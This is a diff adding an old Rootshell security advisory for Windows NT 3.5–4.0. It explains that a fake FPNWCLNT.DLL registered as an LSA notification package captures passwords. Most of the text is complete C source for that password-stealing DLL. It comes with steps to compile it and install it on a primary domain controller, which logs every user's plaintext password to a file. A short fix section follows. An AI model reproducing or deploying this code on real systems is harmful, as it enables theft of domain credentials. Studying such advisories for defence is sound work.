@@ -1,0 +1,111 @@
+
+[ http://www.rootshell.com/ ]
+
+NT Versions affected:
+
+3.5, 3.51, 4.0
+
+Problem:
+
+The registry includes a default entry for
+<HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa> which has a value
+<Notification Packages: REG_MULTI_SZ: FPNWCLNT>. This is a DLL which
+normally exists only in an Netware environment. A false FPNWCLNT.DLL can be
+stored in the %systemroot%\system32 directory which collects passwords in
+plain text.
+
+Comple the below C code and .DEF file into a DLL called FPNWCLNT.DLL and
+copy it to %systemroot%\system32.
+
+Reboot the machine. Password changes and new user creation are funnelled
+through this DLL with the following information, Username, Plaintext
+password, RID (relative domain id).
+
+Install on the Primary domain controller for an NT domain, and it will
+capture all users passwords in plain text.
+
+Exploit code follows:
+
+-----------------cut here-------FPNWCLNT.c-----------------------------
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+struct UNI_STRING {
+USHORT len;
+USHORT maxlen;
+WCHAR *buff;
+};
+
+static HANDLE fh;
+
+BOOLEAN __stdcall InitializeChangeNotify ()
+{
+DWORD wrote;
+fh = CreateFile("C:\\temp\\pwdchange.out",
+GENERIC_WRITE,
+FILE_SHARE_READ|FILE_SHARE_WRITE,
+0,
+CREATE_ALWAYS,
+FILE_ATTRIBUTE_NORMAL|FILE_FLAG_WRITE_THROUGH,
+0);
+WriteFile(fh, "InitializeChangeNotify started\n", 31, &wrote, 0);
+return TRUE;
+}
+
+LONG __stdcall PasswordChangeNotify (
+struct UNI_STRING *user,
+ULONG rid,
+struct UNI_STRING *passwd
+)
+{
+DWORD wrote;
+WCHAR wbuf[200];
+char buf[512];
+char buf1[200];
+DWORD len;
+
+memcpy(wbuf, user->buff, user->len);
+len = user->len/sizeof(WCHAR);
+wbuf[len] = 0;
+wcstombs(buf1, wbuf, 199);
+sprintf(buf, "User = %s : ", buf1);
+WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+memcpy(wbuf, passwd->buff, passwd->len);
+len = passwd->len/sizeof(WCHAR);
+wbuf[len] = 0;
+wcstombs(buf1, wbuf, 199);
+sprintf(buf, "Password = %s : ", buf1);
+WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+sprintf(buf, "RID = %x\n", rid);
+WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+return 0L;
+}
+-----------------------end of
+FPNWCLNT.c------------------------------------
+
+
+
+Verification:
+
+Test it on your machine.
+
+Fix:
+
+The password sniffing DLL is placed as %SYSTEMROOT%\SYSTEM32\FPNWCLNT.DLL
+which is present in a netware environment, but otherwise does not exist. The
+registry by default does have an entry which points to this DLL.
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
+
+has an entry 
+
+Notification Packages: REG_MULTI_SZ: FPNWCLNT. 
+
+Make sure you remove this entry and protect this location in the registry to
+read-only.
+
+----------------------------------------------------------------------
